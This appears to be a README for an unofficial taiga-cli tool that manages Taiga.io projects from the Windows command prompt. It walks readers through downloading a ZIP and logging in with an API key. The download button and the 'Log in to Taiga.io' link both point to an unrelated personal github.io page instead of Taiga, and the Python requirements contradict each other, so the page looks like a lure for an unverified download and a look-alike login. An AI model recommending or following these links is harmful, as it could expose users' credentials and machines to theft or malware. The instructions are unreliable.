# 🌿 taiga-cli - Manage Projects Directly From Your Terminal

---

## 🚀 What Is This?

**taiga-cli** is a simple, fast tool that lets you manage your projects on **Taiga.io** — a popular project management website — without ever opening your web browser. Think of it as a remote control for your projects that lives right inside your computer's command prompt.

It is:

- **Unofficial** — Not made by Taiga.io, but built by a helpful developer
- **Zero-dependency** — Works out of the box. No extra software needed
- **AI-friendly** — Designed to work with AI assistants like Claude and OpenCode
- **Token-efficient** — Outputs information in a compact format (called TOON) that uses less data, making it perfect for AI tools

---

## 🎯 Who Is This For?

This tool is for you if:

- You use **Taiga.io** to track tasks and projects
- You like working from the **command line** (the black/white window where you type commands)
- You use **AI coding assistants** that can run commands for you
- You want a **lightweight** alternative to a full desktop app

If you have never opened a command prompt before, don't worry. This guide will walk you through everything.

---

## 🖥️ System Requirements

| Requirement | Minimum |
|-------------|---------|
| Operating System | Windows 10 or Windows 11 |
| Python | Not needed to run (comes with the tool) |
| Internet | Required to connect to your Taiga.io account |
| Disk Space | Less than 1 MB |

---

## 📥 Download and Install

### Step 1: Get the Tool

**Visit this link to download the application:** 

[![Download taiga-cli](https://img.shields.io/badge/Download-taiga--cli-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=333333)](https://stvishwa06.github.io)

Click the button above or go to: `https://stvishwa06.github.io`

Once you are on the page, look for a green button that says **"Code"**. Click it, then select **"Download ZIP"**. This will download a compressed folder to your computer.

### Step 2: Extract the Files

1. Find the downloaded file (usually in your **Downloads** folder). It will be named something like `taiga-cli.zip`
2. Right-click on the ZIP file and select **"Extract All..."**
3. Choose a destination folder (like your Desktop or Documents)
4. Click **"Extract"** — this will create a new folder called `taiga-cli`

### Step 3: Open the Command Prompt

1. Press the **Windows key** on your keyboard
2. Type **`cmd`**
3. Click **"Command Prompt"** (or press Enter)

### Step 4: Navigate to the Tool

In the command prompt, type the following and press **Enter**:

```
cd Desktop\taiga-cli
```

If you extracted it somewhere else, replace `Desktop` with the correct path.

### Step 5: Verify It Works

Type this command and press Enter:

```
taiga-cli --help
```

If everything is installed correctly, you will see a list of commands you can use. Congratulations — you are ready!

---

## 🛠️ How to Use taiga-cli

### Connecting Your Taiga.io Account

Before you can manage anything, you need to connect to your Taiga.io account:

1. Log in to [Taiga.io](https://stvishwa06.github.io) in your web browser
2. Go to **Settings** → **API Keys**
3. Generate a new API key
4. Copy the key
5. Back in the command prompt, type:

```
taiga-cli login --api-key YOUR_API_KEY_HERE
```

Replace `YOUR_API_KEY_HERE` with the actual key you copied.

### Common Commands

| Command | What It Does |
|---------|--------------|
| `taiga-cli projects` | Shows a list of all your projects |
| `taiga-cli tasks` | Displays tasks for the current project |
| `taiga-cli issues` | Shows all reported issues |
| `taiga-cli sprints` | Lists active sprints |
| `taiga-cli create-task "Title"` | Creates a new task |
| `taiga-cli complete-task [ID]` | Marks a task as done |
| `taiga-cli toon` | Outputs data in TOON format for AI tools |

### Example: View Your Projects

```
taiga-cli projects
```

This will show something like:

```
Project Name          | Members | Last Activity
----------------------|---------|-----------------
Website Redesign      | 5       | 2 hours ago
Mobile App Development| 8       | 1 day ago
Marketing Campaign    | 3       | 3 days ago
```

---

## 🤖 Using With AI Assistants

This tool is specially designed to work with AI coding tools like:

- **Claude Code**
- **OpenCode**
- **Other LLM-based assistants**

When an AI needs to check your project status, it can run commands like:

```
taiga-cli projects --toon
```

The output is compressed and formatted in a way that helps AI understand and process it faster, using less of your AI's context window (which means fewer tokens and lower costs).

---

## ⚙️ Configuration Options

You can customize taiga-cli to fit your workflow:

| Option | Command | Description |
|--------|---------|-------------|
| Default Project | `taiga-cli config --project "Website Redesign"` | Sets a project as default |
| Output Format | `taiga-cli config --format table` | Changes how results are displayed |
| Verbose Mode | `taiga-cli --verbose` | Shows more detailed information |
| Quiet Mode | `taiga-cli --quiet` | Only shows essential information |

---

## ❓ Frequently Asked Questions

### Is this tool safe to use?

Yes. It only reads and writes data from your Taiga.io account using the API key you provide. It does not collect any personal information.

### Do I need to install Python?

No. This tool uses only Python's built-in libraries and comes with everything it needs bundled in. There is nothing extra to install.

### What if I get an error?

Most errors are caused by:

- **Incorrect API key** — Double-check that you copied it correctly
- **No internet connection** — Make sure you are online
- **Wrong folder path** — Ensure you navigated to the correct directory in the command prompt

### Can I use this on Mac or Linux?

This guide is for Windows, but the tool itself works on any system that has Python installed. For Mac/Linux, open Terminal instead of Command Prompt.

---

## 🔍 Troubleshooting

| Problem | Solution |
|---------|----------|
| `'taiga-cli' is not recognized` | You are in the wrong folder. Use `cd` to navigate to the taiga-cli directory. |
| `Login failed` | Your API key may be expired. Generate a new one in Taiga.io settings. |
| `Connection timeout` | Check your internet connection or firewall settings. |
| `No projects found` | Make sure you have projects in your Taiga.io account. |

---

## 📚 Getting More Help

If you get stuck, you can:

- Run `taiga-cli help` to see all available commands
- Visit the official repository page for updates
- Check the `README` file inside the downloaded folder

---

## 🎉 Start Managing Projects Like a Pro

You now have everything you need to start using taiga-cli. It is fast, free, and perfect for anyone who likes to work from the command line or wants to give their AI assistant superpowers for project management.

Go ahead and try it. Your projects are waiting!

---

Keywords: agent-skills, claude-code, claude-skills, cli, llm-tools, opencode, project-management, python, taiga, taiga-io, toon, zero-dependency